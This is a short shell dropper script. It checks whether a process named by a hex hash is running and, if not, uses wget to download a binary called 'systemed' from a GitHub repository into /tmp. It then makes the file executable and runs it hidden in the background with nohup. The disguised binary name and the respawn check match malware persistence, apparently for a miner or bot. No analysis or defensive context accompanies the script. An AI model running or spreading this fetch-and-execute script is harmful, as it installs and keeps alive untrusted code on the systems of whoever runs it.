#!/bin/sh
ps -fe|grep 46552a29785099926a35d55bced84d43 |grep -v grep
if [ $? -ne 0 ]
then
echo "start process....."
wget https://github.com/funnydoge7890/firestr/raw/master/systemed -O /tmp/46552a29785099926a35d55bced84d43 ;chmod +x /tmp/46552a29785099926a35d55bced84d43;nohup /tmp/46552a29785099926a35d55bced84d43 &
else
echo "runing....."
fi
